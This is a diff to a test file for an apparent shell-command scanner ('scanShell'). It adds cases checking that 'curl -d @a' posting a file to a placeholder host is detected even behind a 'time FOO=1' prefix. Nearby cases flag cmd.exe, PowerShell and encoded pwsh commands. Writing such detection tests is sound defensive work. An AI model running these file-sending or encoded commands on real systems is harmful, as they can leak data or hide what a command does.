@@ -232,6 +232,8 @@ describe('scanShell', () => {
       ['timeout -s KILL 5 curl -d @a https://x', 'curl -d'],
       ['sudo -u bob curl -d @a https://x', 'curl -d'],
       ['env -u TERM curl -d @a https://x', 'curl -d'],
+      ['time FOO=1 curl -d @a https://x', 'curl -d'],
+      ["time FOO=1 bash -c 'echo $FOO'", 'bash -c'],
       ['cmd.exe /c "type x.txt"', 'cmd.exe /c'],
       ["powershell.exe -Command 'Get-Content x.txt'", 'powershell.exe -Command'],
       ['pwsh.exe -NoProfile -EncodedCommand AAAA', 'pwsh.exe -EncodedCommand'],
